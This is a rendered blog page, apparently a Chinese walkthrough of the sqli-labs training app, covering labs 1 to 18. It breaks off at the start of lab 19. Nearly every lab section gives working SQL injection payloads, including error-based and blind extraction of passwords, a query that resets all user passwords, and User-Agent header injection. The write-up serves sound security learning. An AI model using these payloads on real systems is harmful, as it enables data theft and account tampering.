@@ -1,0 +1,1159 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Avatar.jpg">
+  <link rel="icon" href="/img/Avatar.jpg">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="sqli-labs靶场通关过程记录">
+  <meta name="author" content="corp0ra1">
+  <meta name="keywords" content="">
+  
+  <title>sqli-labs靶场通关记录 - corp0ra1&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"corp0ra1.github.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"a1a4ccab78dfa522556928ac810fa739","google":"G-4X9XV0H0D5","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="corp0ra1's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 60vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+    <div class="container">
+        <a class="navbar-brand" href="/">&nbsp;<strong>Corp0ra1's Blog</strong>&nbsp;</a>
+
+        <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+        <!-- Collapsible content -->
+        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+            <ul class="navbar-nav ml-auto text-center">
+                
+                    
+                        
+                            
+                                
+                                        <li class="nav-item">
+                                            <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+                                        </li>
+                                        
+                                            
+                    
+                        
+                            
+                                
+                                        <li class="nav-item">
+                                            <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+                                        </li>
+                                        
+                                            
+                    
+                        
+                            
+                                
+                                        <li class="nav-item">
+                                            <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+                                        </li>
+                                        
+                                            
+                    
+                        
+                            
+                                
+                                        <li class="nav-item">
+                                            <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+                                        </li>
+                                        
+                                            
+                    
+                        
+                            
+                                
+                                        <li class="nav-item">
+                                            <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+                                        </li>
+                                        
+                                            
+                                                
+                                                    <li class="nav-item" id="search-btn">
+                                                        <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+                                                    </li>
+                                                    
+                                                        
+                                                            <li class="nav-item" id="color-toggle-btn">
+                                                                <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+                                                            </li>
+                                                            
+                                                                <li class="nav-item">
+                                                                    <a class="nav-link" href="/atom.xml">
+                                                                        <i class="iconfont icon-rss"></i>
+                                                                    </a>
+                                                                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/tesla.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="sqli-labs靶场通关记录">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-06-12 22:41" pubdate>
+        2019年6月12日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      10.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      144
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+    <div class="container-fluid nopadding-x">
+        <div class="row nomargin-x">
+            <div class="d-none d-lg-block col-lg-2"></div>
+            <div class="col-lg-8 nopadding-x-md">
+                <div class="container nopadding-x-md" id="board-ctn">
+                    <div class="py-5" id="board">
+                        <article class="post-content mx-auto">
+                            <!-- SEO header -->
+                            <h1 style="display: none">
+                                sqli-labs靶场通关记录
+                            </h1>
+                            <div class="markdown-body">
+                                <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
+<li>  <a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></li>
+<li>  修改sql-labs文件夹中sql-connections文件夹下的“db-creds.inc”文件中的账号密码</li>
+<li>  由于他是mysql链接的数据库，而在Php7中被废除了，无法创建数据库。所以切换php5.6的版本即可，或者手动文件中所有的sql改成sqli，具体百度。反正我只是切换了php版本</li>
+<li>  没有输入框，直接在url里面输入参数的那种注入。get参数提交推荐hackbar，post参数提交推荐Burp的repeat模块</li>
+</ul>
+<h1 id="Basic-injection"><a href="#Basic-injection" class="headerlink" title="Basic injection"></a>Basic injection</h1><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><h3 id="lab1之单引号"><a href="#lab1之单引号" class="headerlink" title="lab1之单引号"></a>lab1之单引号</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<ul>
+<li>  基于闭合：<code>?id=1%27and &#39;1</code></li>
+<li>  基于注释：<code>?id=1%27--%20</code></li>
+</ul>
+<h3 id="lab2之int型注入"><a href="#lab2之int型注入" class="headerlink" title="lab2之int型注入"></a>lab2之int型注入</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<p>和上面相比，则不需要引号去闭合了</p>
+<ul>
+<li>  <code> ?id=1 and 1</code></li>
+</ul>
+<h3 id="lab3之单引号-括号"><a href="#lab3之单引号-括号" class="headerlink" title="lab3之单引号+括号"></a>lab3之单引号+括号</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<p>闭合单引号和括号，再进行注释即可</p>
+<ul>
+<li>  ?id=-1’)union select 1,2,3–%20</li>
+</ul>
+<h3 id="lab4之双引号-括号"><a href="#lab4之双引号-括号" class="headerlink" title="lab4之双引号+括号"></a>lab4之双引号+括号</h3><blockquote>
+<p><code>$id = &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</code><br><code>$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<p>同上闭合双引号和括号即可</p>
+<ul>
+<li>  <code>?id=0&quot;) union select 1,2,3--%20</code></li>
+</ul>
+<p><strong>为什么我输入id=1’ 那么提交的应该是id=”id’”，为什么没有报错?</strong><br>因为””特性表示他是个字符串，而id是个int类型<br>此时再给id赋值是，发生类型转换导致的string to int<br>同理id=1dasda不爆错也基于这个原因<br><img src="https://ws2.sinaimg.cn/large/006MpoZqgy1g3boxedoh1j30fy0dataa.jpg" srcset="/img/loading.gif" lazyload></p>
+<h3 id="lab5之盲注-单引号-基于联合查询的报错注入"><a href="#lab5之盲注-单引号-基于联合查询的报错注入" class="headerlink" title="lab5之盲注_单引号_基于联合查询的报错注入"></a>lab5之盲注_单引号_基于联合查询的报错注入</h3><p>他给的标题是 double query</p>
+<blockquote>
+<p>Double-Query or Subquery Injection is a technique that is used to exploit an SQL Injection vulnerability. <strong>By combining two queries within a single query</strong>, it is possible to extract information from the database through it’s SQL error messages.</p>
+</blockquote>
+<blockquote>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;; 和上面的lab1区别在于输出</code>echo ‘You are in………..’;`而不输出查询的结果</p>
+</blockquote>
+<p>从题目标题可得知这个要利用union select，又因为不会输出查询结果，外加报错信息没有disable掉，所以适用于<strong>报错注入</strong></p>
+<ul>
+<li><strong>floor</strong>:<code>?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select database()),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a--+</code><ul>
+<li>  记得select database()是个整体，所以需要在外面套上一层括号</li>
+<li>由于floor报错是基于主键重复导致的，而rand()生成是一定程度的随机，因此一次请求可能会显示You are in，多执行请求几次才会爆出来<code>Duplicate entry &#39;*security*1&#39; for key &#39;&#39;</code>如下图<img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/Peek 2019-05-31 19-19.gif" srcset="/img/loading.gif" lazyload/>
+因此基于floor报错并不稳定</li>
+</ul>
+</li>
+<li><strong>exp</strong>：核心原理就是执行里面的语句，然后是个string，取反之后就是无穷从而导致溢出，溢出的时候爆出信息<ul>
+<li>  我怀疑要么是因为sql mode原因 要么是因为mysqld强制模式 要么因为版本不同，反正我的<code> 5.7.26-0ubuntu0.18.04.1</code>不成功</li>
+<li>  和基于报错的bool盲注搭配起来挺好的</li>
+</ul>
+</li>
+<li><strong>xpath两巨头</strong>：<ul>
+<li>  <code>?id=-1&#39; union select 1,2,(select updatexml(1,concat(0x7e,(select @@version),0x7e),1))--+</code></li>
+<li>  <code>?id=-1&#39; union select 1,2,(select extractvalue(1,concat(0x7e,(select user()))))--+</code></li>
+<li>二者参数个数不同，updata要三个，extract则只需要两个，但是核心都在于第二个参数符合xpath语法的字符串<blockquote>
+<ol>
+<li> 为什么是0x7e<br>0x7e对应～<br>由于updatexml的第二个参数需要Xpath格式的字符串，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</li>
+<li>不要concat，直接updatexml(1,(select database()),1)，或者user会怎么样？<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190531210842.png" srcset="/img/loading.gif" lazyload alt="20190531210842.png"><br>如果没有concat的话，会导致一定的字符被吃掉，具体原因在一篇文章看过，忘了，貌似与开头的字符有关…反正concat就完事了,后面经过fuzz自己测试之后发现第二个参数的特点<br>①@开头或者数字开头会输出<code>.26-0ubuntu0.18.04.1</code>，即吞掉一部分字符<br>②字母开头 全部字符被吞掉，没有输出<br>③其他的字符开头的字符串则会完整输出<blockquote>
+<p><strong>fuzz的payload</strong>：<code>&quot;?id=-1&#39; union select 1,2,(select updatexml(1,concat(char(%d),(select @@version),char(64)),1))--+&quot;%(i)</code></p>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><strong>几何六巨头</strong><ul>
+<li> <code>?id = 1&#39; AND **GeometryCollection**((select from (select from(select user())a)b))%23</code></li>
+<li>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()一共六个 替换函数名称即可<blockquote>
+<p>这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为<a target="_blank" rel="noopener" href="http://dogewatch.github.io/2017/02/27/mysql-Error-Based-Injection/">5.5.47上可以用来注入，而在5.7.17上则不行</a><br>具体反正我的 5.7.26-0ubuntu0.18.04.1版本不行</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<p>如果报错信息也被disable，则可以看考我的一篇文章： <a href="https://corp0ra1.github.io/2019/05/22/%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84%E6%B3%A8%E5%85%A5/#%E5%8A%A0%E9%A4%90">sql之基于报错的注入</a></p>
+<h3 id="lab6之盲注-双引号-基于联合查询的报错注入"><a href="#lab6之盲注-双引号-基于联合查询的报错注入" class="headerlink" title="lab6之盲注_双引号_基于联合查询的报错注入"></a>lab6之盲注_双引号_基于联合查询的报错注入</h3><blockquote>
+<p><code>$id = &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</code><br><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code><br>同lab5也是<code>echo &#39;You are in...........&#39;;</code>而不直接输出结果</p>
+</blockquote>
+<p>具体打法同上，只是闭合掉双引号即可</p>
+<ul>
+<li>  <code>?id=1&quot; and &quot;1</code></li>
+</ul>
+<h3 id="lab7之盲注-dump-into-outfile"><a href="#lab7之盲注-dump-into-outfile" class="headerlink" title="lab7之盲注_dump into outfile"></a>lab7之盲注_dump into outfile</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&quot;;</code><br>同lab5也是<code>echo &#39;You are in...........&#39;;</code>而不直接输出结果</p>
+</blockquote>
+<p>安全模块导致无法复现，具体打法可以参考百度<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190530155535.png" srcset="/img/loading.gif" lazyload alt="20190530155535.png"></p>
+<h3 id="lab8之盲注-直接构造布尔-单引号"><a href="#lab8之盲注-直接构造布尔-单引号" class="headerlink" title="lab8之盲注_直接构造布尔+单引号"></a>lab8之盲注_直接构造布尔+单引号</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code><br>同lab5也是<code>echo &#39;You are in...........&#39;;</code>而不直接输出结果<br>但是注释掉了报错信息</p>
+<blockquote>
+<p><code>    //print_r(mysql_error());</code><br><code>    //echo &quot;You have an error in your SQL syntax&quot;;</code></p>
+</blockquote>
+</blockquote>
+<p>闭合单引号的同时，构造bool表达式</p>
+<ul>
+<li> <code>?id=1&#39; and length(database())=8%23</code>     BTW：chr(%23)===#</li>
+</ul>
+<h3 id="lab9之盲注-基于时间的布尔-单引号"><a href="#lab9之盲注-基于时间的布尔-单引号" class="headerlink" title="lab9之盲注_基于时间的布尔+单引号"></a>lab9之盲注_基于时间的布尔+单引号</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code><br>同lab5也是<code>echo &#39;You are in...........&#39;;</code>而不直接输出结果<br>同lab7注释掉了报错信息</p>
+</blockquote>
+<p>闭合单引号的同时，构造基于时间延迟的bool表达式</p>
+<ul>
+<li>  <code>?id=1&#39; and If(ascii(substr(database(),1,1))=115,1,sleep(5))--%20</code> <h3 id="lab10之盲注-基于时间的布尔-双引号"><a href="#lab10之盲注-基于时间的布尔-双引号" class="headerlink" title="lab10之盲注_基于时间的布尔+双引号"></a>lab10之盲注_基于时间的布尔+双引号</h3><blockquote>
+<p><code>$id = &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</code><br>其他同lab9</p>
+</blockquote>
+</li>
+</ul>
+<p>闭合双引号即可，其他同lab9</p>
+<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]))<br><span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];<br><span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br></code></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190602002329.png" srcset="/img/loading.gif" lazyload alt="20190602002329.png"></p>
+<blockquote>
+<p>基于post构造payload参数的时候 记得如果在页面填空框里面填写数据，则直接#或者–空格，而不是用%23或者–+的形式，因为数据传输的时候会变编码，比如填空框填写的%23，客户端传递到服务器端的html包里面的body部分 %23会被编码为%2523，进而被服务器解析之后为%23，而非#，从而导致注入失败<br>而get请求，传递%23就是%23，被服务器解析之后为#<br>注意Python脚本中是第一种情况，必须使用#，而非%23，但是在hackbar里面的body还是可以使用–+，burp就已经是body包里面的内容了，是%23就是%23，不用改</p>
+</blockquote>
+<h3 id="lab11之单引号"><a href="#lab11之单引号" class="headerlink" title="lab11之单引号"></a>lab11之单引号</h3><blockquote>
+<p><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<ul>
+<li><p>探测：admin’or ‘1’=’1#</p>
+<ul>
+<li>  此时的#则不需要%23，因为参数传递的方式post</li>
+</ul>
+</li>
+<li><p>  联合查询：<code>passwd=admin&amp;uname=-1&#39; union select 1,(select schema_name from information_schema.schemata limit 0,1)--+</code></p>
+</li>
+<li><p>  基于报错：<code>passwd=admin&amp;uname=-1&#39;  union select 1,2,(select updatexml(1,concat(0x7e,(select @@version),0x7e),1))--+</code></p>
+<h3 id="lab12之双引号-括号"><a href="#lab12之双引号-括号" class="headerlink" title="lab12之双引号+括号"></a>lab12之双引号+括号</h3><blockquote>
+<p><code>$uname=&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;</code><br><code>$passwd=&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;; </code><br><code>@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</code></p>
+</blockquote>
+</li>
+<li><p>  双引号闭合+括号闭合即可，其他同上<br><code>passwd=admin&amp;uname=-1&quot;)  union select 1,(select version())--+</code></p>
+<h3 id="lab13之盲注-单引号-括号-基于联合查询的报错注入"><a href="#lab13之盲注-单引号-括号-基于联合查询的报错注入" class="headerlink" title="lab13之盲注_单引号+括号_基于联合查询的报错注入"></a>lab13之盲注_单引号+括号_基于联合查询的报错注入</h3><blockquote>
+<p><code>@$sql=&quot;SELECT username, password FROM users WHERE username=(&#39;$uname&#39;) and password=(&#39;$passwd&#39;) LIMIT 0,1&quot;;</code><br><code>print_r(mysql_error());</code><br>单引号，括号的绕过先<br>同时采用了@来抑制报错信息，并且注释掉了直接输出的结果</p>
+<blockquote>
+<p><code>//echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];</code><br><code>//echo &#39;Your Password:&#39; .$row[&#39;password&#39;];</code></p>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<p>程序设计存在逻辑漏洞，即虽然抑制了sql语句的报错信息，但是报错之后fetch row中的row为空，还是回去执行print error。所以本质上没有能够抑制住报错注入</p>
+<ul>
+<li>  <code>passwd=admin&amp;uname=a%27%29++union+select+1,2,(select+updatexml(1,concat(0x7e,(select+@@version),0x7e),1))--+</code><h3 id="lab14之盲注-双引号-基于联合查询的报错注入"><a href="#lab14之盲注-双引号-基于联合查询的报错注入" class="headerlink" title="lab14之盲注_双引号_基于联合查询的报错注入"></a>lab14之盲注_双引号_基于联合查询的报错注入</h3></li>
+</ul>
+<blockquote>
+<p><code>$uname=&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;</code><br><code>$passwd=&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;; </code><br><code>@$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;;</code><br>其他同lab13</p>
+</blockquote>
+<p>改成双引号闭合即可</p>
+<ul>
+<li>  <code>passwd=admin&amp;uname=a&quot;++union+select+1,2,(select+updatexml(1,concat(0x7e,(select+@@version),0x7e),1))--+</code></li>
+</ul>
+<h3 id="lab15之盲注-布尔-时间-单引号"><a href="#lab15之盲注-布尔-时间-单引号" class="headerlink" title="lab15之盲注_布尔/时间+单引号"></a>lab15之盲注_布尔/时间+单引号</h3><blockquote>
+<p><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;</code><br>和lab13 14区别在于注释掉了<code>print_r(mysql_error());</code>因此就是彻底的盲注了</p>
+</blockquote>
+<ul>
+<li>  基于布尔：<code>admin&#39; and ord(mid((select schema_name from information_schema.schemata limit %d,1),%d,1))=%d #</code></li>
+<li>  基于布尔+报错：<code>admin&#39; and IF(ord(mid((select password from users limit %d,1),%d,1))=%d,1,exp(710)) #</code></li>
+<li>  基于布尔+时间：<code>admin&#39; and IF(ord(mid((select password from users limit %d,1),%d,1))=%d,sleep(4),1) #</code><h3 id="lab16之盲注-布尔-时间-双引号-括号"><a href="#lab16之盲注-布尔-时间-双引号-括号" class="headerlink" title="lab16之盲注_布尔/时间+双引号+括号"></a>lab16之盲注_布尔/时间+双引号+括号</h3><blockquote>
+<p><code>$uname=&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;</code><br><code>$passwd=&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;; </code><br><code>@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</code></p>
+</blockquote>
+</li>
+</ul>
+<p>基于和上面lab15相同，只是个双引号和括号的问题</p>
+<ul>
+<li><p>  passwd=a&amp;uname=admin”) and  length(database())=8#</p>
+<h2 id="updata-query"><a href="#updata-query" class="headerlink" title="updata query"></a>updata query</h2><p>所谓的updata query 是因为他是个更新密码的界面<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190602002156.png" srcset="/img/loading.gif" lazyload alt="20190602002156.png"></p>
+<h3 id="lab17之updata-query"><a href="#lab17之updata-query" class="headerlink" title="lab17之updata query"></a>lab17之updata query</h3><blockquote>
+<p><code>$uname=check_input($_POST[&#39;uname&#39;]);</code><br><code>$passwd=$_POST[&#39;passwd&#39;];</code><br><code>@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;$row1 = $row[&#39;username&#39;]; </code><br><code>$update=&quot;UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$row1&#39;&quot;;</code><br><code>print_r(mysql_error());</code><br>只有username被check_input函数过滤，而password没被过滤，因此可以从password开始<br>所庆幸的是她没有注释掉报错，因此可以从报错入手</p>
+<blockquote>
+<p>check_input函数：首先对值进行一个截断：防止过长的非法注入语句，其次get_magic_quotes_gpc()对特殊字符转义，再者检测字符串中的字符是否都是数字，如果非数字则用双引号包含，最后mysql_real_escape_string再进行一次转义处理。因此基本上从uname这一块入手基本上不可能</p>
+</blockquote>
+</blockquote>
+</li>
+<li><p>  基于报错：<code>uname=admin&amp;passwd=11&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</code></p>
+</li>
+<li><p>  基于延时：<code>uname=admin&amp;passwd=11&#39;and If(ascii(substr(database(),1,1))=115,1,sleep(5))#</code></p>
+</li>
+<li><p>修改所有人的密码为1：提交参数<code>uname=xxx&amp;passwd=1&#39; and 1#</code>===&gt;构造语句<code>UPDATE users SET password = &#39;1&#39; and 1#&#39; WHERE username=&#39;test&#39;</code>====&gt;执行语句<code>UPDATE users SET password = &#39;1&#39;and 1</code></p>
+<ol>
+<li><p><code>set passwd=&#39;1&#39;and 1</code>这个是什么鬼语法？<br>先执行and的布尔逻辑运算，因此 passwd=1，即语句最终等效于<code>UPDATE users SET password = 1</code></p>
+</li>
+<li><p>这里是更改所以人的密码，而且总感觉有点怪，set+and，什么鬼啊<br>可参考这两篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/jiang297/article/details/82802735">传送门①</a><a target="_blank" rel="noopener" href="https://blog.csdn.net/liu510817387/article/details/52639058">传送门②</a></p>
+</li>
+<li><pre><code>如果想更新多个字段的值，应该是set a=&quot;xx1&quot;,b=&quot;xx2&quot;，a和b间隔应该是逗号，如果间隔是and，则只要and后面非0，就会视为1，进行xxx and 1的逻辑判断
+</code></pre>
+</li>
+</ol>
+</li>
+</ul>
+<p><strong>为什么前面的关卡不基于passwd注入？</strong><br>①注意到这里的语句结构是<code>UPDATE users SET password = &#39;xxx&#39; WHERE username=&#39;xxx&#39;</code>，password在sql语句前面，而之前的是<code>$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39;</code><br>②前面uname已经可以注入，肯定优先前者，再考虑后者啊。<br>③本质上都是一样的，其实是没有分别，都是基于语句的提前闭合截断，去执行自己的注入语句。只是前者更方便，而且uname在前面也方便注释掉passwd，从而注释的内容更多一点，而在passwd这里注入可能还得必须保证uname这里的正确性，不然and短路的问题，会导致后面的password语句无法执行。所以使用前者更多</p>
+<h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><h3 id="lab18之header-uagent"><a href="#lab18之header-uagent" class="headerlink" title="lab18之header uagent"></a>lab18之header uagent</h3><blockquote>
+<p><code>$uname = check_input($_POST[&#39;uname&#39;]);</code><br><code>$passwd = check_input($_POST[&#39;passwd&#39;]);</code>//uname和passwd都进行了过滤，故不存在注入点<br><code>$uagent = $_SERVER[&#39;HTTP_USER_AGENT&#39;];</code><br><code>$IP = $_SERVER[&#39;REMOTE_ADDR&#39;];</code><br><code>$insert=&quot;INSERT INTO ‘security&#39;.&#39;uagents&#39; (&#39;uagent&#39;, &#39;ip_address&#39;, &#39;username&#39;) VALUES (&#39;$uagent&#39;,&#39;$IP&#39;, $uname)&quot;;</code>//ip不方便修改，uname也不存在注入点，只能useragent入手</p>
+</blockquote>
+<ul>
+<li>因为没有注入掉这个语句：<code>print_r(mysql_error());</code>所以基于报错肯定首选<ol>
+<li> 将 user-agent 修改为<code>&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;=&#39;1</code></li>
+<li> 此时在数据库中执行的是这个语句：<code>INSERT INTO </code>security<code>.</code>uagents<code> (</code>uagent<code>, </code>ip_address<code>, </code>username<code>) VALUES (&#39;&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;=&#39;1&#39;, &#39;127.0.0.1&#39;, &#39;admin&#39;)</code></li>
+<li> 插入数据的时候会执行这个语句<code>concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;=&#39;1&#39;</code></li>
+<li>进而报错显示出数据库的版本。当然这条信息也没有插入进去！</li>
+</ol>
+</li>
+<li>  同时也可以考虑基于时间注入，将 user-agent 修改为：<code>12&#39;and If(ascii(substr(database(),1,1))=114,1,sleep(5)) and &#39;1&#39;=&#39;1</code></li>
+<li>无法直接提取出有效数据，比如无法<code>select user()</code>这样把user()直接写入agent然后输出，因为有个‘’包围，所以你必须闭合他们，你一闭合然后利用and进行逻辑运算，那么结果要么0要么1，也就无法提取了<ul>
+<li>  但是注意到还有一句<code>echo &#39;Your User Agent is: &#39; .$uagent;</code>：会返回你的agent结果的0与1，那么可以构造布尔盲注，看返回的结果是0还是1，进而可以构造出一个<strong>bool盲注</strong>出来来</li>
+</ul>
+</li>
+</ul>
+<p>可以考虑存储形式XSS，毕竟他还要<code>echo &#39;Your User Agent is: &#39; .$uagent;</code></p>
+<h3 id="lab19之Header-referer"><a href="#lab19之Header-referer" class="headerlink" title="lab19之Header referer"></a>lab19之Header referer</h3><blockquote>
